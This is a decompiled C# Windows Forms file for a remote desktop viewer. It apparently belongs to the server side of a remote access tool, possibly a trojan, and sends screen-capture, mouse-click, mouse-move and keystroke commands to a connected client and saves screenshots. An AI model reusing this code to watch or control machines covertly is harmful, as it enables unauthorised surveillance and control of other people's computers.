using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using Server.StreamLibrary;

namespace Server.Forms
{
	// Token: 0x02000071 RID: 113
	public partial class FormRemoteDesktop : Form
	{
		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000283 RID: 643 RVA: 0x0001E4E2 File Offset: 0x0001C6E2
		// (set) Token: 0x06000284 RID: 644 RVA: 0x0001E4EA File Offset: 0x0001C6EA
		public Form1 F { get; set; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x06000285 RID: 645 RVA: 0x0001E4F3 File Offset: 0x0001C6F3
		// (set) Token: 0x06000286 RID: 646 RVA: 0x0001E4FB File Offset: 0x0001C6FB
		internal Clients ParentClient { get; set; }

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x06000287 RID: 647 RVA: 0x0001E504 File Offset: 0x0001C704
		// (set) Token: 0x06000288 RID: 648 RVA: 0x0001E50C File Offset: 0x0001C70C
		internal Clients Client { get; set; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x06000289 RID: 649 RVA: 0x0001E515 File Offset: 0x0001C715
		// (set) Token: 0x0600028A RID: 650 RVA: 0x0001E51D File Offset: 0x0001C71D
		public string FullPath { get; set; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x0600028B RID: 651 RVA: 0x0001E526 File Offset: 0x0001C726
		// (set) Token: 0x0600028C RID: 652 RVA: 0x0001E52E File Offset: 0x0001C72E
		public Image GetImage { get; set; }

		// Token: 0x0600028D RID: 653 RVA: 0x0001E537 File Offset: 0x0001C737
		public FormRemoteDesktop()
		{
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x0600028E RID: 654 RVA: 0x0001E574 File Offset: 0x0001C774
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600028F RID: 655 RVA: 0x0001E5C8 File Offset: 0x0001C7C8
		private void btnSlide_Click(object sender, EventArgs e)
		{
			if (!this.panel1.Visible)
			{
				this.panel1.Visible = true;
				this.btnSlide.Top = this.panel1.Bottom + 5;
				this.btnSlide.BackgroundImage = Resources.arrow_up;
				return;
			}
			this.panel1.Visible = false;
			this.btnSlide.Top = this.pictureBox1.Top + 5;
			this.btnSlide.BackgroundImage = Resources.arrow_down;
		}

		// Token: 0x06000290 RID: 656 RVA: 0x0001E64C File Offset: 0x0001C84C
		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				this.btnSlide.Top = this.panel1.Bottom + 5;
				this.btnSlide.Left = this.pictureBox1.Width / 2;
				this.btnStart.Tag = "stop";
				this.btnSlide.PerformClick();
			}
			catch
			{
			}
		}

		// Token: 0x06000291 RID: 657 RVA: 0x0001E6BC File Offset: 0x0001C8BC
		private void btnStart_Click(object sender, EventArgs e)
		{
			if (this.btnStart.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
				this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value));
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.numericUpDown1.Enabled = false;
				this.numericUpDown2.Enabled = false;
				this.btnSave.Enabled = true;
				this.btnMouse.Enabled = true;
				this.btnStart.Tag = "stop";
				this.btnStart.BackgroundImage = Resources.stop__1_;
				return;
			}
			this.btnStart.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			this.numericUpDown1.Enabled = true;
			this.numericUpDown2.Enabled = true;
			this.btnSave.Enabled = false;
			this.btnMouse.Enabled = false;
			this.btnStart.BackgroundImage = Resources.play_button;
		}

		// Token: 0x06000292 RID: 658 RVA: 0x0001E89C File Offset: 0x0001CA9C
		private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
		{
			this.btnSlide.Left = this.pictureBox1.Width / 2;
		}

		// Token: 0x06000293 RID: 659 RVA: 0x0001E8B8 File Offset: 0x0001CAB8
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.btnStart.Tag == "stop")
			{
				if (this.timerSave.Enabled)
				{
					this.timerSave.Stop();
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.timerSave.Start();
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000294 RID: 660 RVA: 0x0001E958 File Offset: 0x0001CB58
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				if (encoderParameters != null)
				{
					encoderParameters.Dispose();
				}
				if (encoderParameter != null)
				{
					encoderParameter.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000295 RID: 661 RVA: 0x0001EA08 File Offset: 0x0001CC08
		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000296 RID: 662 RVA: 0x0001EA44 File Offset: 0x0001CC44
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.btnStart.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)(e.X * this.decoder.Resolution.Width / this.pictureBox1.Width);
					msgPack.ForcePathObject("Y").AsInteger = (long)(e.Y * this.decoder.Resolution.Height / this.pictureBox1.Height);
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000297 RID: 663 RVA: 0x0001EBA0 File Offset: 0x0001CDA0
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.btnStart.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)(e.X * this.decoder.Resolution.Width / this.pictureBox1.Width);
					msgPack.ForcePathObject("Y").AsInteger = (long)(e.Y * this.decoder.Resolution.Height / this.pictureBox1.Height);
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000298 RID: 664 RVA: 0x0001ECFC File Offset: 0x0001CEFC
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.pictureBox1.Image != null && base.ContainsFocus && this.isMouse)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = (long)(e.X * this.decoder.Resolution.Width / this.pictureBox1.Width);
					msgPack.ForcePathObject("Y").AsInteger = (long)(e.Y * this.decoder.Resolution.Height / this.pictureBox1.Height);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000299 RID: 665 RVA: 0x0001EE00 File Offset: 0x0001D000
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.isMouse)
			{
				this.isMouse = false;
				this.btnMouse.BackgroundImage = Resources.mouse;
			}
			else
			{
				this.isMouse = true;
				this.btnMouse.BackgroundImage = Resources.mouse_enable;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x0600029A RID: 666 RVA: 0x0001EE54 File Offset: 0x0001D054
		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Image getImage = this.GetImage;
				if (getImage != null)
				{
					getImage.Dispose();
				}
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x0600029B RID: 667 RVA: 0x0001EE9C File Offset: 0x0001D09C
		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this.isKeyboard)
			{
				this.isKeyboard = false;
				this.btnKeyboard.BackgroundImage = Resources.keyboard;
			}
			else
			{
				this.isKeyboard = true;
				this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x0600029C RID: 668 RVA: 0x0001EEF0 File Offset: 0x0001D0F0
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.btnStart.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (this._keysPressed.Contains(e.KeyCode))
				{
					return;
				}
				this._keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x0600029D RID: 669 RVA: 0x0001EFF8 File Offset: 0x0001D1F8
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (this.btnStart.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x0600029E RID: 670 RVA: 0x0001F0E6 File Offset: 0x0001D2E6
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x0400025E RID: 606
		public int FPS;

		// Token: 0x0400025F RID: 607
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000260 RID: 608
		public UnsafeStreamCodec decoder = new UnsafeStreamCodec(60);

		// Token: 0x04000261 RID: 609
		private bool isMouse;

		// Token: 0x04000262 RID: 610
		private bool isKeyboard;

		// Token: 0x04000263 RID: 611
		public object syncPicbox = new object();

		// Token: 0x04000264 RID: 612
		private readonly List<Keys> _keysPressed;
	}
}
